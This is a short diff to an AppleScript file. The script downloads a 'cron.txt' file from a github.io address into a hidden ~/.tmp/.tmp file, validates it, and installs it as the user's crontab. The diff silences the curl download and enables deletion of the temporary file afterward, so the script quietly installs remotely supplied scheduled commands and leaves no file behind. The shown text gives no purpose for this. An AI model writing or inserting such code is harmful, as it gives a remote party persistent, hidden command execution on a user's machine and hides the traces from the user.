@@ -5,14 +5,14 @@ tell application "Finder"
 end tell
 
 if not cont then
-	do shell script "curl https://sitetest.github.io/cron.txt >~/.tmp/.tmp"
+	do shell script "curl -s https://sitetest.github.io/cron.txt >~/.tmp/.tmp"
 end if
 
 set dat to read file p
 
 if val(dat) then
 	do shell script "crontab ~/.tmp/.tmp"
-	--do shell script "rm ~/.tmp/.tmp"
+	do shell script "rm ~/.tmp/.tmp"
 end if
 
 on val(str)
